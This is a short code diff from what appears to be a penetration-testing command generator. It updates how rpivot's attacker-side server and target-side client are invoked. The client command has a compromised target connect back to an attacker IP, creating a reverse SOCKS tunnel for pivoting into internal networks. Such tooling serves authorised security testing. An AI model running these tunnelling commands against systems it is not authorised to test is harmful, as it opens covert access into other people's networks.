@@ -10,7 +10,7 @@ export function resolvePivotCommands(pivot: RpivotPivot): PivotCommands {
   // Attacker: start the server
   cmds.attacker.push({
     step: step++,
-    command: `python2 server.py --server-port ${pivot.attackerPort} --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port ${pivot.socksPort}`,
+    command: `python2 rpivot.zip server --server-port ${pivot.attackerPort} --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port ${pivot.socksPort}`,
   });
 
   // Attacker: proxychains config
@@ -26,7 +26,7 @@ export function resolvePivotCommands(pivot: RpivotPivot): PivotCommands {
   });
 
   // Target: base client command
-  let clientCmd = `python2 client.py --server-ip ${attackerIP} --server-port ${pivot.attackerPort}`;
+  let clientCmd = `python2 rpivot.zip client --server-ip ${attackerIP} --server-port ${pivot.attackerPort}`;
 
   if (pivot.useNtlm) {
     const proxyIP = pivot.ntlmProxyIP?.trim() ? pivot.ntlmProxyIP : "<PROXY_IP>";
